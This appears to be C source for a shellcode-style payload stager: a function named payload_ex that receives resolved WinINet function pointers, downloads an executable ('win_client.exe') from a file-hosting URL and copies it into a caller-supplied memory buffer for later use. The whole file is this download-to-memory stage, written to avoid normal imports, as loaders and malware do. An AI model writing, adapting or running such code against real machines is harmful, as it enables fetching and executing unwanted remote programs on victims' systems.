// extern unsigned long long InternetOpen(unsigned short*, int, void*, void*,int);
// //hInternet = InternetOpenW(L"FileDownload", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
// extern unsigned long long InternetOpenUrlA (unsigned long long, char*, void*, int, int, int);
// //hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

// extern void* fopen(char*, char*);

// extern InternetReadFile(unsigned long long, unsigned char*, int, int*);
// /*
//     while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
//         fwrite(buffer, 1, bytesRead, outputFile);
//     }
// */

// extern void fclose(void*);

// extern int InternetCloseHandle(unsigned long long);

// extern int fwrite(unsigned char*, int, int, void*);

#define NULL ((void *)0)
typedef unsigned long long (*InterOpen)(unsigned short*, int, void*, void*,int);
typedef unsigned long long (*InterOpenUrlA)(unsigned long long, char*, void*, int, int, int);
typedef int (*InterReadFile)(unsigned long long, unsigned char*, int, int*);
typedef int (*fwrit)(unsigned char*, int, int, void*);
typedef int (*InterCloseHandle)(unsigned long long);
typedef int (*GetLastRror)(void);

#define INTERNET_FLAG_RELOAD 0x80000000
/*
    args = {
        InternetOpen,
        InternetOpenUrlA,
        InternetReadFile,
        InternetCloseHandle,
        fwrite,
        FILE*,
    }
*/
void payload_ex(unsigned long long* args){
    char url[] = "https://filebin.net/50bn0toze2ttk67a/win_client.exe";
    // char url[] = "http://ipv4.download.thinkbroadband.com/5MB.zip";
    unsigned short junk[] = L"FileDownload";
    InterOpen InternetOpen = args[0];
    InterOpenUrlA InternetOpenUrlA = args[1];
    InterReadFile InternetReadFile = args[2];
    InterCloseHandle InternetCloseHandle = args[3];
    // fwrit fwrite = args[4];
    // void* outputFile = args[5];
    unsigned char* ret_buf = args[4];
    int* ret_sz = args[5];
    // GetLastRror GetLastError = args[6];
    char buffer[16];
    int bytesRead = 0;
    int ptr = 0;
    unsigned long long hInternet, hConnect;
    int failes = 100;
    hInternet = InternetOpen(junk, 1, NULL, NULL, 0);
    if (hInternet == NULL) {
        return;
    }

    // Open a connection to the URL
    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        int c =  GetLastError();
        InternetCloseHandle(hInternet);
        return;
    }

    // Create and open a local file to save the downloaded data
    // Download and save the file
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        // fwrite(buffer, 1, bytesRead, outputFile);

        for (int i = 0; i < bytesRead; ++i){
            ret_buf[ptr++] = buffer[i];
        }
    }
    *ret_sz = ptr;
    // printf("We got here\n");
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return;
}